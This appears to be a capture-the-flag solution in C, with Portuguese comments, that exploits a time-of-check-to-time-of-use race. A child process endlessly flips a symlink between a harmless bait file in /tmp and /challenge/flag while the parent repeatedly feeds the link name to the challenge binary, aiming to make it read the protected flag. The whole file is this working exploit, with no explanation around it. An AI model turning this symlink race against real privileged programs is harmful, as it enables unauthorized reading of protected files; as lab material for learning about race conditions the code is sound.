#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>


int main(){

    pid_t pid = fork();

    char *bait_flag = "bait_flag";   
    char *destino_isca = "/tmp/gustavoraceconditions/bait.txt";
    char *destino_flag = "/challenge/flag";


    

    if(pid < 0){
        perror("Erro no fork");
    }

    else if(pid == 0){ // Processo filho
        while(1){
            unlink(bait_flag);
            symlink(destino_isca, bait_flag); // Cria o link
            unlink(bait_flag); // Apaga o link
            symlink(destino_flag,bait_flag); // Faz o link para o alvo
        }

    } else{ // Processo pai
        
        while(1){ // Loop para a execução do challenge
            system("echo bait_flag | /challenge/challenge");
        }
    }

    return 0;

}